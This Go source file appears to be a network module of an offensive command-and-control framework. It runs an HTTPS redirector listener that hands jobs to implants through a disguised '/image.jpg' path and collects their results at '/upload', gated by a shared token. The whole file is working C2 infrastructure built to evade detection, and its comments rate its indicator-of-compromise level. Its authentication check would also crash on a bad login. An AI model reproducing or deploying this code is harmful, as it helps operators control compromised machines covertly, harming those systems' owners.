// +build selfsignedhttpsgo
//// Listening Network Module for Redirectors ///////////////////////////////////////////////////////////
//
//   Network Method: Egress to a https Golang Server redirector, using a self signed certificate.Implant will not check target TLS fingenprint.
//
//   Warnings:       wILL work with MITM tls proxies, but server certificate is not signed.              
//                   
//   Fingenprint:    GO-LANG TLS Libraries (target OS network stack?)
//
//   IOC Level:      Medium
//   
//
///////////////////////////////////////////////////////////////////////////////////////////////////////

package main

import (

	"crypto/tls"
    "github.com/gorilla/mux"
    "net/http"
    "encoding/json"
    "bytes"
    "fmt"
    "time"
    //Debug
    //"net/http/httputil"

)

type RedSelfSignedhttps struct {
	Port string   `json:"port"`
}

type BiAuth struct {
    Bid string   `json:"bid"`
    Token string  `json:"token"`  
}

// Transport Level Socket Function

func bichitoHandler(){

	//Decode Module Parameters, create listener socket
	var moduleParams *RedSelfSignedhttps
	errDaws := json.Unmarshal([]byte(redconfig.Coms),&moduleParams)
    if errDaws != nil {
        //ErrorLog
        addLog("Network(Listener JSON decoding error)"+errDaws.Error())
    }
    socket := "0.0.0.0:" + moduleParams.Port

    router := mux.NewRouter()
    router.Use(commonMiddleware)

    //Hive Servlet - Users
    router.HandleFunc("/image.jpg", SendJobs).Methods("GET")
    router.HandleFunc("/upload", ReceiveJob).Methods("POST")

    //TLS configurations
    cfg := &tls.Config{
        MinVersion:               tls.VersionTLS12,
        CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
        PreferServerCipherSuites: true,
        CipherSuites: []uint16{
            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
            tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_RSA_WITH_AES_256_CBC_SHA,
        },
    }
    srv := &http.Server{
        ReadHeaderTimeout: 10 *time.Second,
        ReadTimeout: 20 * time.Second,
        WriteTimeout: 40 * time.Second,
        Addr:         socket,
        Handler:      router,
        TLSConfig:    cfg,
        TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
    }

    err := srv.ListenAndServeTLS("red.pem", "red.key")
    if err != nil {
    	//ErrorLog
        fmt.Println("Error starting https server:"+err.Error())
		addLog("Network(Listener Starting Error)"+err.Error())
        panic(err)
    }

}

func commonMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Add("Content-Type", "application/json")
        next.ServeHTTP(w, r)
    })
}

//Retrieve all the Jobs that need to be sent back to target Bot
func SendJobs(w http.ResponseWriter, r *http.Request) {
    
    //Auth
    bid := biAuth(r.Header.Get("Authorization"))
    if bid == "Bad"{
        return
    }    

    //Debug: Send Hive Jobs to Bichito
    /*
    requestDump, err2 := httputil.DumpRequest(r, true)
    if err2 != nil {
        fmt.Println(err2)
    }
    fmt.Println(string(requestDump))
    */

    json.NewEncoder(w).Encode(getBiJobs(bid))

    
}


//Redirector posting the jobs they have finished/unfinished
func ReceiveJob(w http.ResponseWriter, r *http.Request) {

    //Auth
    bid := biAuth(r.Header.Get("Authorization"))
    if bid == "Bad"{
        return
    }     

    decoder := json.NewDecoder(r.Body)
    var jobs []*Job
    err := decoder.Decode(&jobs)
    if err != nil {
		go addLog("Jobs(Error Decoding Bichito Job)"+err.Error())
		return
    }

    //Debug: Get the Jobs from Bichito and send to Hive
    /*
    requestDump, err2 := httputil.DumpRequest(r, true)
    if err2 != nil {
        fmt.Println(err)
    }
    fmt.Println(string(requestDump))
    */

    go processJobs(jobs)

}


// Check Authorization header for a JSON encoded object:
// Authorization: JSON{domain,token}
// If a valid token, process, if not drop connection and log

func biAuth(authbearer string) string{

    var biauth *BiAuth
    //Decode auth bearer
    decoder := json.NewDecoder(bytes.NewBufferString(authbearer))
    err := decoder.Decode(&biauth)

    if err != nil{
        go addLog("Bichito Authentication Json Decoding Error"+err.Error())
        return "Bad"
    }

    if biauth.Token == redconfig.BiToken{
        return biauth.Bid
    }

	go addLog("Bichito bad login!"+err.Error())
    return "Bad"

}